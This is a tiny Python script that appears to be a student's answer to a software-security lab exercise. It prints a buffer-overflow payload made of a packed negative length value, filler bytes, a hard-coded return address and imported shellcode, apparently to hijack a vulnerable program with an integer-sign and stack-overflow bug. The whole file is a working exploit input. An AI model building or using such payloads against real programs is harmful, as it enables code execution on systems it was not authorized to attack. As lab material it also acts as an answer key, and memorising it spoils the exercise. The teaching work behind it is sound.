#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(pack("<i", -1) + pack("<I", 0x69696969)*7 + pack("<I", 0xFFFE9D20) + shellcode + b"\xff")